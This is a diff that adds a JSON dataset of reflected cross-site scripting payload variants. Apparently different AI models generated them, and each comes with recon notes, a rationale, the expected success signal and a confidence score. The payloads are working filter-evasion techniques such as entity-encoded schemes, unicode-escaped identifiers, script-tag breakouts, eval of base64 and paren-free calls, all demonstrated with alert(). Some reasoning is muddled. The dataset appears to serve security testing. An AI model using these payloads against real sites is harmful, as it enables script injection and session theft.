+   "expected_success_signal": "alert(1) executes on mouseover of the styled confirmation element; the &apos; sequences were decoded to genuine quotes before JS parsing.",
+   "confidence": 0.7,
+   "reasoning": "The body-reflected email value lands inside a paired event attribute even though quote characters are HTML-encoded. Browsers decode character references before evaluating attribute JavaScript, so the encoded quote path applies without modification in this endpoint context."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /outbox/preview?link=https://example.com",
+   "target_param": "link",
+   "recon_evidence": "GET /outbox/preview?link=javascript:alert(1) is rejected with a scheme-violation warning while arbitrary non-scheme text reflects verbatim into an <a> tag's href; repeat testing shows a literal, case-insensitive substring match on 'javascript' in the scheme check.",
+   "planner_rationale": "An entity embedded inside the scheme name evades the literal keyword block because browsers decode entities in attribute values before URL parsing.",
+   "vuln_class": "xss_reflected",
+   "payload": "<a href=\"jav&#x61script:alert(3)\">a</a>",
+   "injection_point": "query",
+   "expected_success_signal": "The rendered 'a' link navigates with a javascript: URL and alert(3) executes on user click despite the scheme filter.",
+   "confidence": 0.8,
+   "reasoning": "The filter performs a plain substring check for 'javascript', which a character reference embedded in the scheme name defeats. Since entity decoding occurs before attribute URLs are parsed, the browser reconstructs the javascript: scheme at run time exactly as intended."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "POST /reviews/render",
+   "target_param": "snippet",
+   "recon_evidence": "POST /reviews/render with snippet=<img src=x onerror=alert(1)> leaves <img> markup intact but returns a filtered page flagging the literal substring 'alert', which is blocked wherever it appears; the surviving markup still reaches an event-handler attribute in the response.",
+   "planner_rationale": "\\uXXXX escapes compile to the identifier at tokenization time, so keyword blocking of 'alert' does not stop the call.",
+   "vuln_class": "xss_reflected",
+   "payload": "<img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1) />",
+   "injection_point": "body",
+   "expected_success_signal": "The src-less image fires onerror and alert(1) executes even though 'alert' never appears literally in the request.",
+   "confidence": 0.72,
+   "reasoning": "The observed control blocks the literal 'alert' keyword while tolerating img markup, so the handler's function name is rewritten with \\uXXXX escapes that pass filtering during transport. Identifier escapes are resolved during JavaScript tokenization, fully reassembling the call after the attribute value is in place."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_4",
+  "model": "opencode/glm-5.3-flash-free",
+  "variant": {
+   "endpoint": "GET /ui/theme/preview",
+   "target_param": "X-Client-Theme",
+   "recon_evidence": "GET /ui/theme/preview mirrors the X-Client-Theme header verbatim into an inline diagnostic widget's markup; a gateway-level keyword rule blocks any request whose headers contain the literal substring 'alert' (403 observed), yet img tags and their attributes pass through untouched.",
+   "planner_rationale": "Unicode escapes assemble the identifier after transport filtering, so the banned keyword never crosses the filter.",
+   "vuln_class": "xss_reflected",
+   "payload": "<img src onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1) />",
+   "injection_point": "header",
+   "expected_success_signal": "The src-less image triggers onerror and alert(1) executes although the token 'alert' never appears literally in the header or response.",
+   "confidence": 0.6,
+   "reasoning": "The echoed header reaches markup where event-handler content executes as JavaScript, and the only observed control is a literal-keyword rule applied during transmission. Writing the identifier with \\uXXXX escapes sidesteps that transmission-time check, and the identifier reassembles when the handler is tokenized."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /account/welcome?displayName=bob",
+   "target_param": "displayName",
+   "recon_evidence": "The value is reflected verbatim inside a single-quoted JS string in an inline <script> block: var greeting = '<reflected>';. Submitting a single quote is escaped to \\', but a raw < character is passed through unescaped.",
+   "planner_rationale": "If angle brackets survive, we don't need to break the JS string at all — just terminate the script element and let the HTML parser start a new tag.",
+   "vuln_class": "xss_reflected",
+   "payload": "</script><img src=1 onerror=alert(document.domain)>",
+   "injection_point": "query",
+   "expected_success_signal": "Browser closes the script block at </script> and fires onerror on the injected img, alerting the document domain; no JS escaping is required.",
+   "confidence": 0.9,
+   "reasoning": "HTML tokenization occurs before JavaScript parsing, so an injected </script> ends the script element regardless of the single-quote string context, and the following img tag executes as markup. This matches the observed unescaped angle brackets in the reflected inline script."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "POST /api/v1/comments",
+   "target_param": "body",
+   "recon_evidence": "The submitted comment is echoed into a JSON response that a client-side script assigns to a variable in an external bundle loaded over /static/app.js. Angle brackets are filtered, but the reflection occurs inside a double-quoted JS string literal.",
+   "planner_rationale": "No HTML context is reachable, so close the string and statement directly, then comment out the trailing code to preserve syntax.",
+   "vuln_class": "xss_reflected",
+   "payload": "';alert(document.domain)//",
+   "injection_point": "body",
+   "expected_success_signal": "alert(document.domain) executes when the external script parses the injected value, and the trailing // suppresses the original closing quote so the bundle keeps running.",
+   "confidence": 0.82,
+   "reasoning": "The value lands inside a double... single-quoted string in an external JS file where the </script> technique is unavailable, so the string must be broken from within. Terminating the statement and commenting the remainder keeps the surrounding script syntactically valid."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /preferences/render",
+   "target_param": "ui_lang",
+   "recon_evidence": "A cookie value supplied as ui_lang=<value> is read server-side and written into an inline script as var lang = '<reflected>';. Single quotes and backslashes are escaped, but the surrounding markup uses double quotes elsewhere and the script is inline rather than external.",
+   "planner_rationale": "Escaping targets the string, not the tag; an inline script can still be closed with </script> before any JS escaping matters.",
+   "vuln_class": "xss_reflected",
+   "payload": "</script><img src=1 onerror=alert(document.domain)>",
+   "injection_point": "cookie",
+   "expected_success_signal": "When the page renders the cookie-derived lang variable, the injected </script> closes the block and the img onerror handler alerts the domain.",
+   "confidence": 0.66,
+   "reasoning": "Escaping the single-quoted JS string is irrelevant because the payload never needs to leave the string — it ends the HTML script element first. Confidence is moderated because cookie reflection depends on the server echoing the value into the rendered page rather than only using it internally."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_5",
+  "model": "opencode/deepseek-v4.1-flash-free",
+  "variant": {
+   "endpoint": "GET /docs/{slug}/view",
+   "target_param": "slug",
+   "recon_evidence": "The path segment is reflected into a JS bootstrap blob served inline: window.__DOC__ = {\"slug\":\"<reflected>\"}. Doubles quotes are stripped from the value, but parentheses and semicolons survive.",
+   "planner_rationale": "Since quotes are stripped, rely on the string-termination + comment pattern; if stripping breaks the quote, reassess with a different delimiter.",
+   "vuln_class": "xss_reflected",
+   "payload": "';alert(document.domain)//",
+   "injection_point": "path",
+   "expected_success_signal": "The patched bootstrap script executes alert(document.domain) and the commented tail prevents a parse error in the remaining object literal.",
+   "confidence": 0.58,
+   "reasoning": "The path value is reflected into an inline JavaScript string context where the in-JS breakout applies. Confidence is lower because the recon notes quote stripping, so the exact terminator character is speculative and depends on which quote style actually reaches the response."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /search",
+   "target_param": "q",
+   "recon_evidence": "The search term is echoed back inside an inline JavaScript template literal: var msg = `Results for ${userInput}`; no quote escaping observed.",
+   "planner_rationale": "Since the reflection lands inside backticks, a bare ${alert(1)} expression executes without needing to break out of any string delimiter.",
+   "vuln_class": "xss_reflected",
+   "payload": "${alert(1)}",
+   "injection_point": "query",
+   "expected_success_signal": "alert dialog fires when the results page renders the template literal",
+   "confidence": 0.9,
+   "reasoning": "Template literals evaluate ${ ... } as expressions directly, so injecting the interpolation syntax requires no quote-breaking and executes immediately when the reflected string is evaluated."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /profile/welcome",
+   "target_param": "firstname",
+   "recon_evidence": "First name is reflected inside a template literal, but responses containing the literal substring '${' are rejected with a 400 or sanitized before rendering.",
+   "planner_rationale": "Direct ${} injection is stripped, so use the nested backtick chain which the page itself demonstrates re-enters evaluation one level deeper.",
+   "vuln_class": "xss_reflected",
+   "payload": ";`${`${`${`${alert(1)}`}`}`}`",
+   "injection_point": "query",
+   "expected_success_signal": "alert executes through the nested backtick chain despite the ${ filter",
+   "confidence": 0.75,
+   "reasoning": "The nested-literal chain re-enters template-literal evaluation through successive backticks, so a filter that strips a single level of ${} still lets the innermost expression run once the outer levels compile."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "POST /feedback/preview",
+   "target_param": "comment",
+   "recon_evidence": "Comment text is copied into an inline <script> block, and the WAF returns a block page whenever eval, atob, or alert appear verbatim in the request.",
+   "planner_rationale": "Keyword filter blocks readable function names, so deliver the logic with unicode-escaped identifiers plus base64-decoded script content.",
+   "vuln_class": "xss_reflected",
+   "payload": "\\u0065\\u0076\\u0061\\u006C(\\u0061\\u0074\\u006F\\u0062('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='))",
+   "injection_point": "body",
+   "expected_success_signal": "Decoded payload runs inside the inline script and fires alert(1) with no readable keywords present",
+   "confidence": 0.82,
+   "reasoning": "The unicode-escaped eval(atob(...)) form presents only escape sequences to the keyword filter while the engine compiles the real identifiers, and the base64 blob decodes to a full <script>alert(1)</script> element at runtime."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /docs/view",
+   "target_param": "doc",
+   "recon_evidence": "Document ID is reflected unquoted inside a script context on a debug view that exposes eval; a keyword filter strips eval/atob/alert from the query string.",
+   "planner_rationale": "Inline script context with eval available calls for the unicode-escape + base64 delivery so no banned keywords reach the filter.",
+   "vuln_class": "xss_reflected",
+   "payload": "\\u0065\\u0076\\u0061\\u006C(\\u0061\\u0074\\u006F\\u0062('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='))",
+   "injection_point": "query",
+   "expected_success_signal": "alert dialog appears even though the request contained none of the blacklisted function names",
+   "confidence": 0.7,
+   "reasoning": "Reflecting into an unescaped script context lets the escaped eval(atob(...)) chain compile into the real calls, decoding to executable script content while the filter only ever sees backslash-u sequences."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_6",
+  "model": "opencode/mimo-v2.6-flash-free",
+  "variant": {
+   "endpoint": "GET /greet",
+   "target_param": "msg",
+   "recon_evidence": "Message parameter is interpolated into a JavaScript template literal in a reflected header script, and responses containing the raw '${' substring are silently dropped before send.",
+   "planner_rationale": "A simple ${} probe is filtered, so escalate to the nested-backtick payload which the target's own CSP-bypass notes show still evaluates.",
+   "vuln_class": "xss_reflected",
+   "payload": ";`${`${`${`${alert(1)}`}`}`}`",
+   "injection_point": "query",
+   "expected_success_signal": "alert fires via the nested template-literal chain even though '${' was stripped once",
+   "confidence": 0.65,
+   "reasoning": "The chain of nested backticks reconstructs an evaluable template literal after a single-pass ${ strip, so the innermost alert(1) still executes when the reflected script is parsed."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /promo/landing",
+   "target_param": "utm_content",
+   "recon_evidence": "Response body embeds the utm_content value verbatim inside an inline <script> template literal: var seg=`REFLECTED`; (self-contained copy of the page shows the value intact). A filter probe with alert(1) came back as alert1, while alert`1` survived byte-for-byte, so only round brackets are stripped and backticks are allowed.",
+   "planner_rationale": "Paren-free JS in a template-literal sink: use a tagged-template call so the tag function is invoked without parentheses.",
+   "vuln_class": "xss_reflected",
+   "payload": "alert`1`",
+   "injection_point": "query",
+   "expected_success_signal": "Inline script executes alert on page load with no parentheses present in the served response",
+   "confidence": 0.9,
+   "reasoning": "The value lands in a template-literal expression, and the filter only removes '(' and ')', so the backtick tagged-template form still reaches the parser. In tagged-template position the string '1' is passed as the first argument to alert, giving a parenthesis-free call in a context that would otherwise have been inert text."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "POST /api/v2/products/4411/reviews",
+   "target_param": "reviewBody",
+   "recon_evidence": "The submitted JSON body field reviewBody is rendered unescaped into the review widget's inline bootstrap script (var body=REFLECTED; then document.write(body)). A probe containing alert(1) returned alert1 and alert`1` returned empty brackets, while the reflected copy preserved { }, $ and square brackets; parenthesised calls are the only thing stripped.",
+   "planner_rationale": "Parentheses are filtered but template literals are not, so call any function through Reflect.apply.call with arguments supplied as template substitutions.",
+   "vuln_class": "xss_reflected",
+   "payload": "Reflect.apply.call`${alert}${window}${[1337]}`",
+   "injection_point": "body",
+   "expected_success_signal": "Reflect.apply.call invokes alert with this=window and argument 1337, firing the dialog on the product page",
+   "confidence": 0.86,
+   "reasoning": "Because the sanitizer removes parentheses, the payload routes the call through the generic invoker Reflect.apply.call rather than writing alert(...) directly. Backtick argument substitution supplies the function, the this value and the [1337] array, so the call executes with real arguments even though no parenthesis character survives the filter."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /dashboard/panel",
+   "target_param": "X-Debug-Trace",
+   "recon_evidence": "With debug enabled the server echoes the X-Debug-Trace request header into an inline analytics snippet: new Function('t', REFLECTED) . Probing showed both backtick and parenthesis characters are rejected/stripped, the double quote is emitted raw, and \\x28 is left un-decoded in the reflected copy, so no character-level escape decoding happens before the script is parsed.",
+   "planner_rationale": "No backticks and no parentheses available: hijack the error handler and throw a string that onerror=eval will execute.",
+   "vuln_class": "xss_reflected",
+   "payload": "window.onerror=eval;throw\"=alert\\x281\\x29\"",
+   "injection_point": "header",
+   "expected_success_signal": "Assigned onerror handler evaluates the thrown string and a dialog appears with 1",
+   "confidence": 0.78,
+   "reasoning": "With parentheses and backticks blocked, the only remaining execution primitive is the error path: window.onerror=eval makes any uncaught error value be passed to eval, and throw hands it the string alert\\x281\\x29. The string concatenation with = keeps it a single expression statement, so the only assumption is that the header value is reflected into a script context without further sanitisation."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "POST /cart/checkout",
+   "target_param": "cart_session",
+   "recon_evidence": "The cart_session cookie value is echoed into an inline single-page bootstrap block (window.__CART__.trace = REFLECTED) and is not URL-decoded or entity-decoded on output. A filter probe with alert(1) returned alert1, while alert`1` and other backtick payloads were returned unchanged, indicating only round brackets are stripped at the cookie filter.",
+   "planner_rationale": "Cookie-controlled value reaches a JavaScript template literal with parentheses stripped; tagged-template invocation is the cleanest paren-free call.",
+   "vuln_class": "xss_reflected",
+   "payload": "alert`1`",
+   "injection_point": "cookie",
+   "expected_success_signal": "Bootstrap script evaluates the trace value as a tagged template and alert fires once the checkout page loads",
+   "confidence": 0.74,
+   "reasoning": "The reflection point is an assignment inside a script block, so a bare backtick expression is parsed as a tagged-template call rather than inert text. Since the cookie filter only strips parentheses, the payload passes unchanged and executes alert with the implicit string argument. Confidence is held lower because cookie-controlled values are often additionally escaped on the response path."
+  }
+ },
+ {
+  "class": "xss_reflected",
+  "batch": "xss_reflected_7",
+  "model": "opencode/space-bunny-free",
+  "variant": {
+   "endpoint": "GET /reports/2026/q1/summary",
+   "target_param": "segment",
+   "recon_evidence": "Router path segments are appended into an inline chart config (var series=[REFLECTED]) without per-segment normalisation; the reflected copy showed backticks and dollar-brace sequences preserved, while only round brackets were stripped by the edge WAF. No path traversal filtering or encoding of these characters was observed.",
+   "planner_rationale": "Path segment is injected into a JS array literal with parentheses filtered, so drive the call through Reflect.apply.call and backtick argument substitution.",
+   "vuln_class": "xss_reflected",
+   "payload": "Reflect.apply.call`${alert}${window}${[1337]}`",
+   "injection_point": "path",
+   "expected_success_signal": "Chart config script invokes alert via Reflect.apply with 1337 after the page renders the summary segment",
+   "confidence": 0.63,
+   "reasoning": "If the segment is concatenated into a script array without encoding, the Reflect.apply.call form provides a full argument-passing call despite the parenthesis filter. This is the weakest variant because it depends on the path being decoded and re-emitted verbatim, so confidence reflects that speculative assumption."
+  }
+ }
+]
